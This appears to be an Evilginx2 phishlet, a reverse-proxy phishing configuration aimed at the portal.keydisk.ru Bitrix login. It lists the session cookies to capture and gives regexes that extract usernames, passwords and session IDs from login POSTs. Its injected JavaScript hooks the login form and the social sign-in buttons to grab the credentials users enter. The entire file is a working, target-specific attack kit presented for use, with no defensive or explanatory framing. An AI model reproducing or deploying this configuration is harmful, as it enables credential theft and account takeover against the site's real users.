author: 'AKUMA-EvilGinx2-AutoInstaller'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'portal.keydisk.ru', session: true, is_landing: true}

sub_filters:
  - {triggers_on: 'portal.keydisk.ru', orig_sub: '', domain: 'portal.keydisk.ru', search: 'portal.keydisk.ru', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.keydisk.ru'
    keys: ['KEYDISK_SM_UIDH', 'KEYDISK_SM_LOGIN', 'KEYDISK_SM_CC', 'BITRIX_SM_SALE_UID']
  - domain: 'portal.keydisk.ru'  
    keys: ['KEYDISK_SM_UIDH', 'KEYDISK_SM_LOGIN', 'KEYDISK_SM_CC', 'BITRIX_SM_SALE_UID']

auth_urls:
  - '/index.php?login=yes'
  - '/auth/'
  - '/bitrix/tools/oauth/'

credentials:
  username:
    key: 'USER_LOGIN'
    search: '(USER_LOGIN=([^&]*)|"USER_LOGIN":\s*"([^"]*)")'
    type: 'post'
  password:
    key: 'USER_PASSWORD' 
    search: '(USER_PASSWORD=([^&]*)|"USER_PASSWORD":\s*"([^"]*)")'
    type: 'post'
  custom:
    - key: 'bitrix_sessid'
      search: '(bitrix_sessid=([^&]*)|"bitrix_sessid":\s*"([^"]*)")'
      type: 'post'
    - key: 'AUTH_FORM'
      search: '(AUTH_FORM=([^&]*)|"AUTH_FORM":\s*"([^"]*)")'
      type: 'post'

login:
  domain: 'portal.keydisk.ru'
  path: '/index.php?login=yes'

auto_filter:
  - hostname: 'portal.keydisk.ru'
    regexp: '(https?://)portal\.keydisk\.ru'
    replace: '{proto}{hostname}'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']
  - hostname: 'portal.keydisk.ru'
    regexp: 'portal\.keydisk\.ru'
    replace: '{hostname}'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']

js_inject:
  - trigger_domains: ["portal.keydisk.ru"]
    trigger_paths: ["/index.php"]
    trigger_params: ["login"]
    script: |
      var p = new Promise(function(resolve, reject) {
        var to = setTimeout(function() {
          reject();
        }, 10000);
        
        var authForm = document.querySelector('form[name="form_auth"]');
        if (authForm) {
          authForm.addEventListener('submit', function(e) {
            var loginField = authForm.querySelector('input[name="USER_LOGIN"]');
            var passField = authForm.querySelector('input[name="USER_PASSWORD"]');
            
            if (loginField && passField && loginField.value && passField.value) {
              clearTimeout(to);
              resolve({
                username: loginField.value,
                password: passField.value,
                domain: 'portal.keydisk.ru'
              });
            }
          });
        }
        
        // Social auth detection
        var socialBtns = document.querySelectorAll('.bx-auth-serv-icon');
        socialBtns.forEach(function(btn) {
          btn.addEventListener('click', function() {
            clearTimeout(to);
            var provider = 'Unknown';
            if (btn.classList.contains('google')) provider = 'Google';
            else if (btn.classList.contains('liveid')) provider = 'LiveID';
            resolve({
              social_auth: true,
              provider: provider
            });
          });
        });
      });
      return p;
